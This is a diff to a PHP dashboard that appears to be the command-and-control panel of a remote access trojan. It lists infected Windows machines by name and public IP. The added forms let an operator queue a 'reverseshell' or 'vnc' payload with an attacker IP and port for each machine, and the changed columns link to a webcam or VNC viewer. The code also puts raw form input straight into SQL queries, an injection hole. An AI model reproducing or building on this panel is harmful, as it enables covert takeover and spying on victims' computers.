@@ -38,6 +38,8 @@ try{
 }
 return $pdo;
 }
+
+
 ?>
 
 <?php
@@ -72,6 +74,16 @@ $pdo = conn();
 $stmt = $pdo->prepare('SELECT * FROM user where id = 4');
 $stmt->execute();
 return $stmt->fetchAll();
+}
+
+function insert_payload()
+{
+$pdo = conn();
+$sql = "INSERT INTO user (payload) VALUES (?)";
+
+$stmt = $pdo->prepare('INSERT INTO user (payload) VALUES (?)');
+//$stmt= $pdo->prepare($sql);
+$stmt->execute([$payload]);
 }
 
 ?>  
@@ -205,9 +217,9 @@ return $stmt->fetchAll();
                                                 <td class="mv-icon">Logo</td>
                                                 <td class="computer-name">Computer Name</td>
                                                 <td class="public-ip">Public IP address</td>
-                                                <td class="local-ip">Local IP address</td>
+                                                <td class="local-ip">Payload</td>
                                                 <td class="os">OS</td>
-                                                <td class="last-seen">Last seen</td>
+                                                <td class="last-seen">Camera</td>
                                                 <td class="stats-chart">Heartbeat status</td>
                                             </tr>
                                             <tr>
@@ -217,48 +229,166 @@ return $stmt->fetchAll();
                                                 
                                                 <td class="computer-name"><a href="http://kptain.ratz.rs/gui/noVNC/vnc.html"><?php $first = requet1()[0]; print_r($first['name']); ?> </a </td>
                                                 <td class="public-ip"> <?php $first = requet1()[0]; print_r($first['ip']); ?> </td>
-                                                <td class="local-ip"></td>
+                                                <td class="local-ip">
+                                                
+                                                <form method="post">
+                                                <p>
+                                                    <select name="payload">
+                                                        <option value="empty"></option>
+                                                        <option value="vnc">vnc</option>
+                                                        <option value="reverseshell">reverseshell</option>
+                                                        <option value="">empty</option>
+                                                        <option value="">empty</option>
+                                                    </select>
+
+                                                    <input type="submit" value="Go" title="valider" /><br>
+                                                    <input type="number" name="port" value="Port :" size="6">
+                                                    <input type="text" name="ip" value="IP :" size="12" >
+                                                    </form>
+                                               
+                                                </p>
+                                                
+                                                <?php
+                                                    if ($_POST['payload'] == 'reverseshell' || $_POST['payload'] == 'vnc' && $_POST['ip'] != 'IP :' && !empty($_POST['port'])  )
+                                                    {
+                                                    $concat = $_POST['payload'] . " " . $_POST['ip'] . " " . $_POST['port'];
+                                                    //print_r($concat);
+                                                    $pdo = conn();
+                                                    $stmt = $pdo->prepare("UPDATE user SET payload = '" . $concat ."' WHERE id = 1;");
+                                                    $stmt->execute();
+
+                                                    }
+                                                    
+                                                ?>
+                                                </td>
                                                 <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
-                                                <td class="last-seen"></td>
+                                                <td class="last-seen"><a href="http://kptain.ratz.rs/gui/noVNC/vnc.html"> <img src="assets/images/icon/camera.ico" alt="icon"> </td>
                                                 <td class="stats-chart">
                                                     <canvas id="mvaluechart"></canvas>
                                                 </td>
                                             </tr>
                                             <tr>
                                                 <td class="mv-icon">
-                                                    <div class="mv-icon"><img src="assets/images/icon/dashboard/uk.png" alt="icon"></div>
+                                                    <div class="mv-icon"><img src="assets/images/icon/dashboard/eu.png" alt="icon"></div>
                                                 </td>
                                                 <td class="computer-name"><a href="http://kptain.ratz.rs/noVNC/vnc.html"><?php $first = requet2()[0]; print_r($first['name']); ?> </a </td>
                                                 <td class="public-ip"> <?php $first = requet2()[0]; print_r($first['ip']); ?> </td>
-                                                <td class="local-ip"></td>
+                                                <td class="local-ip">
+                                                <form method="post">
+                                                <p>
+                                                    <select name="payload1">
+                                                        <option value="empty"></option>
+                                                        <option value="vnc">vnc</option>
+                                                        <option value="reverseshell">reverseshell</option>
+                                                        <option value="">empty</option>
+                                                        <option value="">empty</option>
+                                                    </select>
+
+                                                    <input type="submit" value="Go" title="valider" /><br>
+                                                    <input type="number" name="port1" value="Port :" size="6">
+                                                    <input type="text" name="ip1" value="IP :" size="12">
+                                                    </form>
+                                               
+                                                </p>
+                                                
+                                                <?php
+                                                    if ($_POST['payload1'] == 'reverseshell' || $_POST['payload1'] == 'vnc' && $_POST['ip1'] != 'IP :' && !empty($_POST['port1'])) 
+                                                    {
+                                                    $concat = $_POST['payload1'] . " " . $_POST['ip1'] . " " . $_POST['port1'];
+                                                    $pdo = conn();
+                                                    $stmt = $pdo->prepare("UPDATE user SET payload = '" . $concat ."' WHERE id = 2;");
+                                                    $stmt->execute();
+
+                                                    }
+                                                    
+                                                ?>
+                                                </td>
                                                 <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
-                                                <td class="last-seen"></td>
+                                                <td class="last-seen"><a href="http://kptain.ratz.rs/gui/noVNC/vnc.html"> <img src="assets/images/icon/camera.ico" alt="icon"> </td>
                                                 <td class="stats-chart">
                                                     <canvas id="mvaluechart2"></canvas>
                                                 </td>
                                             </tr>
                                             <tr>
                                                 <td class="mv-icon">
-                                                    <div class="mv-icon"><img src="assets/images/icon/dashboard/de.png" alt="icon"></div>
+                                                    <div class="mv-icon"><img src="assets/images/icon/dashboard/eu.png" alt="icon"></div>
                                                 </td>
                                                 <td class="computer-name"><a href="http://kptain.ratz.rs/noVNC/vnc.html"><?php $first = requet3()[0]; print_r($first['name']); ?> </a </td>
                                                 <td class="public-ip"> <?php $first = requet3()[0]; print_r($first['ip']); ?> </td>
-                                                <td class="local-ip"></td>
+                                                <td class="local-ip">
+                                                <form method="post">
+                                                <p>
+                                                    <select name="payload2">
+                                                        <option value="empty"></option>
+                                                        <option value="vnc">vnc</option>
+                                                        <option value="reverseshell">reverseshell</option>
+                                                        <option value="">empty</option>
+                                                        <option value="">empty</option>
+                                                    </select>
+
+                                                    <input type="submit" value="Go" title="valider" /><br>
+                                                    <input type="number" name="port2" value="Port :" size="6">
+                                                    <input type="text" name="ip2" value="IP :" size="12">
+                                                    </form>
+                                               
+                                                </p>
+                                                
+                                                <?php
+                                                    if ($_POST['payload2'] == 'reverseshell' || $_POST['payload2'] == 'vnc' && $_POST['ip2'] != 'IP :' && !empty($_POST['port2']) )
+                                                    {
+                                                    $concat = $_POST['payload2'] . " " . $_POST['ip2'] . " " . $_POST['port2'];
+                                                    $pdo = conn();
+                                                    $stmt = $pdo->prepare("UPDATE user SET payload = '" . $concat ."' WHERE id = 3;");
+                                                    $stmt->execute();
+
+                                                    }
+
+                                                ?>
+                                                </td>
                                                 <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
-                                                <td class="last-seen"></td>
+                                                <td class="last-seen"><a href="http://kptain.ratz.rs/gui/noVNC/vnc.html"> <img src="assets/images/icon/camera.ico" alt="icon"> </td>
                                                 <td class="stats-chart">
                                                     <canvas id="mvaluechart3"></canvas>
                                                 </td>
                                             </tr>
                                             <tr>
                                                 <td class="mv-icon">
-                                                    <div class="mv-icon"><img src="assets/images/icon/dashboard/it.png" alt="icon"></div>
+                                                    <div class="mv-icon"><img src="assets/images/icon/dashboard/eu.png" alt="icon"></div>
                                                 </td>
                                                 <td class="computer-name"><a href="http://kptain.ratz.rs/noVNC/vnc.html"><?php $first = requet4()[0]; print_r($first['name']); ?> </a </td>
                                                 <td class="public-ip"> <?php $first = requet4()[0]; print_r($first['ip']); ?> </td>
-                                                <td class="local-ip"></td>
+                                                <td class="local-ip">
+                                                <form method="post">
+                                                <p>
+                                                    <select name="payload3">
+                                                        <option value="empty"></option>
+                                                        <option value="vnc">vnc</option>
+                                                        <option value="reverseshell">reverseshell</option>
+                                                        <option value="">empty</option>
+                                                        <option value="">empty</option>
+                                                    </select>
+
+                                                    <input type="submit" value="Go" title="valider" /><br>
+                                                    <input type="number" name="port3" value="Port :" size="6">
+                                                    <input type="text" name="ip3" value="IP :" size="12">
+                                                    </form>
+                                               
+                                                </p>
+                                                
+                                                <?php
+                                                    if ($_POST['payload3'] == 'reverseshell' || $_POST['payload3'] == 'vnc' && $_POST['ip3'] != 'IP :' && !empty($_POST['port3']) )
+                                                    {
+                                                    $concat = $_POST['payload3'] . " " . $_POST['ip3'] . " " . $_POST['port3'];
+                                                    $pdo = conn();
+                                                    $stmt = $pdo->prepare("UPDATE user SET payload = '" . $concat ."' WHERE id = 4;");
+                                                    $stmt->execute();
+
+                                                    }
+                                                     
+                                                ?>
+                                                </td>
                                                 <td class="os"><img src="assets/images/icon/dashboard/win10.png" alt="icon"></td>
-                                                <td class="last-seen"></td>
+                                                <td class="last-seen"><a href="http://kptain.ratz.rs/gui/noVNC/vnc.html"> <img src="assets/images/icon/camera.ico" alt="icon"> </td>
                                                 <td class="stats-chart">
                                                     <canvas id="mvaluechart4"></canvas>
                                                 </td>
@@ -316,3 +446,4 @@ return $stmt->fetchAll();
 </body>
 
 </html>
+6
